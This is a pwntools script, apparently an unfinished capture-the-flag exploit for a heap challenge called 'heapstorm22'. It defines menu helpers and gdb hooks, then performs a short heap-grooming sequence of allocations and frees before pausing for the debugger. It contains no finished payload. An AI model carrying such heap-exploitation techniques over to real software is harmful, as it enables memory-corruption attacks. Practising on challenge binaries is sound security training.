#! /usr/bin/env python3
from pwn import *

arch = 64
challenge = './heapstorm22'

context.os='linux'
context.log_level = 'debug'
if arch==64:
    context.arch='amd64'
if arch==32:
    context.arch='i386'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(challenge)
libc = ELF('libc.so.6')

local = 1
if local:
    p = process(challenge)
else:
    p = remote('chuj.top', '53178')


def debug():
    gdb.attach(p)
    pause()

bps = []
pie = 1
def gdba():
    if local == 0:
        return 0
    cmd ='set follow-fork-mode parent\n'
    #cmd=''
    if pie:
        base = int(os.popen("pmap {}|awk '{{print $1}}'".format(p.pid)).readlines()[1],16)
        cmd += ''.join(['b *{:#x}\n'.format(b+base) for b in bps])
        cmd += 'set $base={:#x}\n'.format(base)
    else:
        cmd+=''.join(['b *{:#x}\n'.format(b) for b in bps])

    gdb.attach(p,cmd)

def eat():
    p.recvuntil('mand: ')

def create(size):
    eat()
    p.sendline('1')
    p.recvuntil('Size: ')
    p.sendline(str(size))

def edit(index, content):
    eat()
    p.sendline('2')
    p.recvuntil('Index: ')
    p.sendline(str(index))
    p.recvuntil('Size: ')
    p.sendline(str(len(content)))
    p.recvuntil('Content:')
    p.send(content)

def delete(index):
    eat()
    p.sendline('3')
    p.recvuntil('Index: ')
    p.sendline(str(index))

def show(index):
    eat()
    p.sendline('4')
    p.recvuntil('Index: ')
    p.sendline(str(index))



create(0x4d8)# 0
create(0x18)# 1
create(0x4e8)# 2
create(0x18)# 3


delete(0)
delete(2)
debug()
create(0x4d8)






p.interactive()